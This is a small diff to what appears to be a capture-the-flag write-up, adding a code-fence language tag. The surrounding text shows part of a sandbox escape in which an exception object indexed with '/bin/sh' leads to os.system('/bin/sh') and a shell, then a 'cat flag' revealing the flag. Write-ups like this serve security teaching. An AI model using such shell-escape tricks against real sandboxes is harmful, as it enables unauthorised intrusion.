@@ -125,6 +125,7 @@ except CustomException as e:
 	e["/bin/sh"]
 ```
 Which will end up executing: ```os.system("/bin/sh")```, providing us an unlimited shell.
-```$ cat flag
+```bash
+$ cat flag
 CTF{CzeresniaTopolaForsycja}
 ```
